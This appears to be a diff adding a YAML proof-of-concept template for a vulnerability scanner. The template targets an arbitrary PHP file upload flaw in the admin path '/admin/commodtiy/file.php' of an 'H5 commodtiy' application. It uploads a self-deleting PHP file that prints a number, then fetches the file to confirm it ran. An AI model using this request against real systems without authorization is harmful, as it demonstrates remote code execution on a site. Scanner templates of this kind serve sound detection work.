@@ -1,0 +1,36 @@
+name: poc-yaml-H5-commodtiy-file-upload
+transport: http
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /admin/commodtiy/file.php?upload=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+      body: "\
+        ------WebKitFormBoundaryFQqYtrIWb8iBxUCx\r\n\
+        Content-Disposition: form-data; name=\"file\"; filename=\"test.php\"\r\n\
+        Content-Type: application/octet-stream\r\n\
+        \r\n\
+        <?php print(111*222);unlink(__FILE__);?>\r\n\
+        ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--\r\n\
+        "
+    expression: response.status == 200
+    output:
+      search: '"(?P<uploadfile>[0-9]+\\.php)".bsubmatch(response.body)'
+      uploadfile: search["uploadfile"]
+  r1:
+    request:
+      method: GET
+      path: /admin/commodtiy/upload/{{uploadfile}}
+    expression: response.status == 200 && response.body.bcontains(b'24642')
+expression: r0() && r1()
+
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139317758
+
+
